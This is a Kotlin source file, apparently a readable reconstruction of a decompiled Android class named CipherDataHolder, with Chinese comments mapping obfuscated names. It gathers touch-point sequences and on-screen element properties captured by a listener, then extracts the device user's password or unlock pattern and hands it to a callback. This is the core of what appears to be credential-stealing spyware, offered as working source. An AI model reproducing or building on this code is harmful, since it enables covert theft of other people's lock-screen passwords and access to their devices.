package com.storm.safe.rock.service.modules.cipher

import android.util.Log
import java.io.Serializable
import java.util.ArrayList
import java.util.LinkedList

/**
 * 密码数据持有者 — 收集触摸坐标和属性响应，提取最终密码。
 *
 * JADX: CipherDataHolder.java (175 行)
 * 字段映射:
 *   f53225a0 → listenHelper    (监听辅助)
 *   f53226a1 → propResponses   (属性响应列表)
 *   f53227a2 → touchPoints     (触摸坐标列表)
 *
 * 方法映射:
 *   a0() → extractCipher()
 */
class CipherDataHolder : Serializable {

    companion object {
        private const val TAG = "CipherDataHolder"
    }

    /** 监听辅助配置 */
    var listenHelper: ListenHelper? = null

    /** 属性响应列表 (id/text/desc/adb_coord) */
    val propResponses: LinkedList<ListenPropResponse> = LinkedList()

    /** 触摸坐标序列 */
    val touchPoints: LinkedList<Point> = LinkedList()

    /**
     * 从收集的数据中提取密码。
     * vendor: a0(h10, h10, h10, h10) — 4 个函数参数
     *
     * @param extractByIdFunc   通过 resource ID 提取密码
     * @param extractByTextFunc 通过文本内容提取密码
     * @param validateFunc      验证密码是否有效
     * @param resultCallback    提取成功后的回调
     */
    fun extractCipher(
        extractByIdFunc: (LinkedList<ListenPropResponse>) -> CipherResult?,
        extractByTextFunc: (LinkedList<ListenPropResponse>) -> CipherResult?,
        validateFunc: (String?) -> Boolean,
        resultCallback: (CipherResult) -> Unit
    ) {
        val helper = listenHelper ?: return

        // 在同步块中复制数据
        val touchCopy: LinkedList<Point>
        val propCopy: LinkedList<ListenPropResponse>
        synchronized(this) {
            touchCopy = LinkedList(touchPoints)
            propCopy = LinkedList(propResponses)
        }

        if (propCopy.isEmpty() && touchCopy.isEmpty()) return

        // 情况 1: 只有触摸点，没有属性响应
        if (propCopy.isEmpty() && touchCopy.isNotEmpty()) {
            if (touchCopy.size < 4) {
                Log.d(TAG, "触摸点不足 ${touchCopy.size}, 需要 >= 4")
                return
            }
            Log.d(TAG, "仅触摸点模式: ${touchCopy.size} 点")
            val result = CipherResult()
            result.touchCipher = ArrayList(touchCopy)
            result.cipherGradeCode = "PASSWORD_QUALITY_TOUCH_POINTS"
            resultCallback(result)
            return
        }

        // 情况 2: listenHelper.a0 == 1 且有触摸点
        val mode = helper.a0
        if (mode != null && mode == 1 && touchCopy.isNotEmpty()) {
            if (touchCopy.size < 6) {
                Log.d(TAG, "模式1触摸点不足 ${touchCopy.size}, 需要 >= 6")
                return
            }
            val result = CipherResult()
            result.touchCipher = ArrayList(touchCopy)
            result.cipherGradeCode = "PASSWORD_QUALITY_TOUCH_POINTS"
            resultCallback(result)
        }

        if (propCopy.isEmpty()) return

        // 按属性类型分组
        val idList = LinkedList<ListenPropResponse>()
        val textList = LinkedList<ListenPropResponse>()
        val descList = LinkedList<ListenPropResponse>()
        val adbCoordList = LinkedList<ListenPropResponse>()

        for (resp in propCopy) {
            when (resp.prop) {
                "id" -> idList.add(resp)
                "text" -> textList.add(resp)
                "desc" -> descList.add(resp)
                "adb_coord" -> adbCoordList.add(resp)
            }
        }

        // adb_coord 优先处理
        if (adbCoordList.isNotEmpty()) {
            Log.d(TAG, "adb_coord 条目: ${adbCoordList.size}")
            if (adbCoordList.size < 6) {
                Log.d(TAG, "adb_coord 不足 6 条")
                return
            }
            val result = CipherResult()
            result.touchCipher = ArrayList(touchCopy)
            result.cipherGradeCode = "PASSWORD_QUALITY_TOUCH_POINTS"
            // 拼接 adb_coord 值
            val values = ArrayList<String>()
            for (resp in adbCoordList) {
                resp.value?.let { values.add(it) }
            }
            result.textCipher = values.joinToString("|")
            resultCallback(result)
            return
        }

        // 通过 ID 提取
        var finalResult: CipherResult? = null
        if (idList.isNotEmpty()) {
            if (idList.size > 1) {
                idList.sortBy { it.timestamp }
            }
            finalResult = extractByIdFunc(idList)
            if (finalResult?.textCipher.isNullOrEmpty()) {
                finalResult = null
            }
        }

        // 通过 text 提取
        if (textList.isNotEmpty()) {
            if (textList.size > 1) {
                textList.sortBy { it.timestamp }
            }
            val textResult = extractByTextFunc(textList)
            if (textResult != null && !textResult.textCipher.isNullOrEmpty()) {
                if (finalResult == null) {
                    finalResult = textResult
                } else if (finalResult.textCipher.isNullOrEmpty()) {
                    finalResult.textCipher = textResult.textCipher
                }
            }
        }

        // 通过 desc 提取 (复用 extractByIdFunc)
        if (descList.isNotEmpty()) {
            if (descList.size > 1) {
                descList.sortBy { it.timestamp }
            }
            val descResult = extractByIdFunc(descList)
            if (descResult != null && !descResult.textCipher.isNullOrEmpty()) {
                if (finalResult == null) {
                    finalResult = descResult
                } else if (finalResult.textCipher.isNullOrEmpty()) {
                    finalResult.textCipher = descResult.textCipher
                }
            }
        }

        // 验证并返回结果
        if (finalResult != null && validateFunc(finalResult.textCipher)) {
            if (touchCopy.isNotEmpty()) {
                finalResult.touchCipher = ArrayList(touchCopy)
            }
            finalResult.toString()
            resultCallback(finalResult)
        }
    }
}
